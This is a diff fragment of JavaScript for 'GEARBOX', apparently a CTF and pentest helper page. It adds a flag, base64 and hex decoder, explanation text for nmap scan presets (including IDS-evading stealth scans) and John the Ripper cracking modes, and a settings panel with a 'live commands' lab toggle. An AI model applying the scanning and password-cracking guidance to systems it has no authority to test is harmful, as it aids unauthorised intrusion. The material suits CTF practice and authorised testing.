+    let results = [];
+    
+    // Check for flags
+    const flagRegex = /FLAG\{[^}]+\}/gi;
+    const flags = text.match(flagRegex);
+    if (flags) {
+      results.push(`🏁 FLAGS FOUND: ${flags.join(', ')}`);
+    }
+    
+    // Check for base64
+    const b64Regex = /^[A-Za-z0-9+/=]+$/;
+    if (b64Regex.test(text.trim()) && text.length > 10) {
+      try {
+        const decoded = atob(text.trim());
+        results.push(`📝 Base64 Decoded: ${decoded}`);
+      } catch (e) {
+        results.push(`📝 Looks like Base64 but decode failed`);
+      }
+    }
+    
+    // Check for hex
+    const hexRegex = /^[0-9a-fA-F\s]+$/;
+    if (hexRegex.test(text.replace(/\s/g, '')) && text.length > 10) {
+      try {
+        const hex = text.replace(/\s/g, '');
+        const decoded = hex.match(/.{2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
+        results.push(`🔢 Hex Decoded: ${decoded}`);
+      } catch (e) {
+        results.push(`🔢 Looks like hex but decode failed`);
+      }
+    }
+    
+    // Check for URLs
+    const urlRegex = /https?:\/\/[^\s]+/g;
+    const urls = text.match(urlRegex);
+    if (urls) {
+      results.push(`🌐 URLs Found: ${urls.join(', ')}`);
+    }
+    
+    // Check for IP addresses
+    const ipRegex = /\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b/g;
+    const ips = text.match(ipRegex);
+    if (ips) {
+      results.push(`🌐 IP Addresses: ${ips.join(', ')}`);
+    }
+    
+    // Check for email addresses
+    const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+    const emails = text.match(emailRegex);
+    if (emails) {
+      results.push(`📧 Email Addresses: ${emails.join(', ')}`);
+    }
+    
+    if (results.length === 0) {
+      results.push("🔍 No obvious patterns detected. Try different analysis methods!");
+    }
+    
+    return results.join('\n\n');
+  }
+  
+  // Helper functions for explanations
+  function getNmapExplanation(preset, config) {
+    const explanations = {
+      'stealth': `🥷 STEALTH MODE EXPLANATION:
+• Uses SYN scan (-sS) - doesn't complete TCP handshake
+• Very slow timing (-T2) - mimics human behavior
+• Hard to detect by intrusion detection systems
+• Best for: Penetration testing, avoiding detection`,
+      'balanced': `⚖️ BALANCED MODE EXPLANATION:
+• Uses SYN scan (-sS) for speed
+• Moderate timing (-T4) - good balance
+• Some detection risk but much faster
+• Best for: General reconnaissance, time-limited scans`,
+      'aggressive': `🚀 YEET MODE EXPLANATION:
+• Full port scan (1-65535) - comprehensive
+• Aggressive timing (-T5) - maximum speed
+• OS detection (-A) - tries to identify target OS
+• Very detectable but gets maximum information
+• Best for: Internal networks, authorized testing only`
+    };
+    return explanations[preset];
+  }
+  
+  function getJohnExplanation(preset) {
+    const explanations = {
+      'wordlist': `📚 WORDLIST ATTACK EXPLANATION:
+• Tries common passwords from a dictionary
+• Fast and effective against weak passwords
+• Uses rockyou.txt (14 million common passwords)
+• Best for: Most CTF challenges and real-world testing`,
+      'incremental': `🔢 BRUTE FORCE ATTACK EXPLANATION:
+• Tries ALL possible character combinations
+• Extremely slow but will eventually find any password
+• Can take days/weeks for complex passwords
+• Best for: Short passwords or when wordlist fails`,
+      'hybrid': `🎯 HYBRID ATTACK EXPLANATION:
+• Combines wordlist with character variations
+• Tries wordlist + numbers, symbols, case changes
+• More thorough than wordlist alone
+• Best for: When you suspect passwords are variations of common words`
+    };
+    return explanations[preset];
+  }
+  
+  // Clear output function
+  function clearOutput() {
+    document.querySelectorAll('.output').forEach(output => {
+      output.style.display = 'none';
+      output.textContent = '';
+    });
+  }
+  
+  // Settings function
+  function showSettings() {
+    const modal = document.createElement('div');
+    modal.style.cssText = `
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.8);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    `;
+    
+    const settingsPanel = document.createElement('div');
+    settingsPanel.style.cssText = `
+      background: var(--matrix-bg);
+      border: 2px solid var(--matrix-medium);
+      padding: 30px;
+      max-width: 400px;
+      width: 90%;
+      color: var(--matrix-bright);
+      font-family: 'Courier New', monospace;
+    `;
+    
+    settingsPanel.innerHTML = `
+      <h2 style="margin: 0 0 20px 0; text-align: center; text-transform: uppercase;">[SETTINGS]</h2>
+      
+      <div style="margin: 15px 0;">
+        <label style="display: block; margin-bottom: 8px; font-size: 12px; text-transform: uppercase;">Theme Color:</label>
+        <select id="themeSelect" style="width: 100%; padding: 8px; background: var(--matrix-bg); color: var(--matrix-bright); border: 1px solid var(--matrix-medium); font-family: 'Courier New', monospace;">
+          <option value="antimeme" selected>Anti-Meme (Default)</option>
+          <option value="matrix">Matrix Green</option>
+          <option value="amber">Amber Terminal</option>
+          <option value="cyan">Cyan Terminal</option>
+          <option value="red">Red Alert</option>
+          <option value="blue">Blue Screen</option>
+          <option value="purple">Purple Haze</option>
+          <option value="white">White Terminal</option>
+        </select>
+      </div>
+      
+      <div style="margin: 15px 0;">
+        <label style="display: block; margin-bottom: 8px; font-size: 12px; text-transform: uppercase;">Font Size:</label>
+        <select id="fontSizeSelect" style="width: 100%; padding: 8px; background: var(--matrix-bg); color: var(--matrix-bright); border: 1px solid var(--matrix-medium); font-family: 'Courier New', monospace;">
+          <option value="14">Small (14px)</option>
+          <option value="16" selected>Medium (16px)</option>
+          <option value="18">Large (18px)</option>
+        </select>
+      </div>
+      
+      <div style="margin: 15px 0;">
+        <label style="display: block; margin-bottom: 8px; font-size: 12px; text-transform: uppercase;">Lab Mode:</label>
+        <label style="display: flex; align-items: center; font-size: 12px;">
+          <input type="checkbox" id="labModeToggle" style="margin-right: 8px;">
+          Enable Live Commands (DANGEROUS!)
+        </label>
+      </div>
+      
+      <div style="text-align: center; margin-top: 30px;">
+        <button onclick="applySettings()" style="background: var(--matrix-bg); color: var(--matrix-bright); border: 1px solid var(--matrix-medium); padding: 10px 20px; margin: 5px; cursor: pointer; font-family: 'Courier New', monospace; text-transform: uppercase;">[APPLY]</button>
+        <button onclick="closeSettings()" style="background: var(--matrix-bg); color: var(--matrix-bright); border: 1px solid var(--matrix-medium); padding: 10px 20px; margin: 5px; cursor: pointer; font-family: 'Courier New', monospace; text-transform: uppercase;">[CLOSE]</button>
+      </div>
+      
+      <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid var(--matrix-medium); font-size: 10px; color: var(--matrix-dark); text-align: center; line-height: 1.3;">
+        <div>GEARBOX v1.0 - Built by Outer Heaven</div>
+        <div>MIT License - All rights reserved</div>
+        <div>GEARBOX™ is a trademark of Outer Heaven</div>
+        <div style="margin-top: 8px; font-style: italic;">Educational use only. No warranty provided.</div>
+      </div>
+    `;
+    
+    modal.appendChild(settingsPanel);
+    document.body.appendChild(modal);
+    
+    // Close on background click
+    modal.addEventListener('click', function(e) {
+      if (e.target === modal) {
+        closeSettings();
+      }
+    });
+  }
+  
+  function applySettings() {
+    const theme = document.getElementById('themeSelect').value;
+    const fontSize = document.getElementById('fontSizeSelect').value;
+    const labMode = document.getElementById('labModeToggle').checked;
+    
+    // Apply theme
+    if (theme === 'antimeme') {
+      // Anti-Meme (Default) - Clean white background
+      document.documentElement.style.setProperty('--matrix-bg', '#ffffff');
+      document.documentElement.style.setProperty('--matrix-dark', '#f0f0f0');
+      document.documentElement.style.setProperty('--matrix-medium', '#000000');
+      document.documentElement.style.setProperty('--matrix-bright', '#000000');
+    } else if (theme === 'matrix') {
+      // Matrix Green
+      document.documentElement.style.setProperty('--matrix-bg', '#0D0208');
+      document.documentElement.style.setProperty('--matrix-dark', '#003B00');
+      document.documentElement.style.setProperty('--matrix-medium', '#008F11');
+      document.documentElement.style.setProperty('--matrix-bright', '#00FF41');
+    } else if (theme === 'amber') {
+      // Amber Terminal
+      document.documentElement.style.setProperty('--matrix-bg', '#1a1a1a');
+      document.documentElement.style.setProperty('--matrix-dark', '#2d2d00');
+      document.documentElement.style.setProperty('--matrix-medium', '#ffaa00');
+      document.documentElement.style.setProperty('--matrix-bright', '#ffcc00');
+    } else if (theme === 'cyan') {
+      // Cyan Terminal
+      document.documentElement.style.setProperty('--matrix-bg', '#0a0a0a');
+      document.documentElement.style.setProperty('--matrix-dark', '#002d2d');
+      document.documentElement.style.setProperty('--matrix-medium', '#00aaaa');
+      document.documentElement.style.setProperty('--matrix-bright', '#00ffff');
+    } else if (theme === 'red') {
+      // Red Alert
+      document.documentElement.style.setProperty('--matrix-bg', '#1a0000');
+      document.documentElement.style.setProperty('--matrix-dark', '#2d0000');
+      document.documentElement.style.setProperty('--matrix-medium', '#aa0000');
+      document.documentElement.style.setProperty('--matrix-bright', '#ff0000');
+    } else if (theme === 'blue') {
+      // Blue Screen
+      document.documentElement.style.setProperty('--matrix-bg', '#000080');
+      document.documentElement.style.setProperty('--matrix-dark', '#000040');
+      document.documentElement.style.setProperty('--matrix-medium', '#0080ff');
+      document.documentElement.style.setProperty('--matrix-bright', '#ffffff');
+    } else if (theme === 'purple') {
+      // Purple Haze
+      document.documentElement.style.setProperty('--matrix-bg', '#1a0a1a');
+      document.documentElement.style.setProperty('--matrix-dark', '#2d0a2d');
+      document.documentElement.style.setProperty('--matrix-medium', '#aa00aa');
+      document.documentElement.style.setProperty('--matrix-bright', '#ff00ff');
+    } else if (theme === 'white') {
+      // White Terminal
+      document.documentElement.style.setProperty('--matrix-bg', '#ffffff');
+      document.documentElement.style.setProperty('--matrix-dark', '#cccccc');
+      document.documentElement.style.setProperty('--matrix-medium', '#666666');
+      document.documentElement.style.setProperty('--matrix-bright', '#000000');
+    } else {
+      // Fallback to Anti-Meme
+      document.documentElement.style.setProperty('--matrix-bg', '#ffffff');
+      document.documentElement.style.setProperty('--matrix-dark', '#f0f0f0');
+      document.documentElement.style.setProperty('--matrix-medium', '#000000');
+      document.documentElement.style.setProperty('--matrix-bright', '#000000');
+    }
+    
+    // Apply font size
+    document.body.style.fontSize = fontSize + 'px';
+    
+    // Apply lab mode
+    const labModeElement = document.getElementById('labMode');
+    if (labMode) {
+      labModeElement.innerHTML = '<div>[DANGER] LAB MODE: ON</div><div style="font-size:10px;margin-top:4px;">LIVE COMMANDS ENABLED</div>';
+      labModeElement.classList.add('enabled');
+    } else {
+      labModeElement.innerHTML = '<div>[SAFE] LAB MODE: OFF</div><div style="font-size:10px;margin-top:4px;">DRY-RUN ONLY</div>';
+      labModeElement.classList.remove('enabled');
+    }
+    
+    closeSettings();
+  }
+  
+  function closeSettings() {
+    const modal = document.querySelector('div[style*="position: fixed"]');
+    if (modal) {
+      modal.remove();
+    }
+  }
+  
+  // Initialize the page
+  document.addEventListener('DOMContentLoaded', function() {
+    console.log('🛡️ GEARBOX loaded successfully!');
+  });
   </script>
 </body>
 </html>
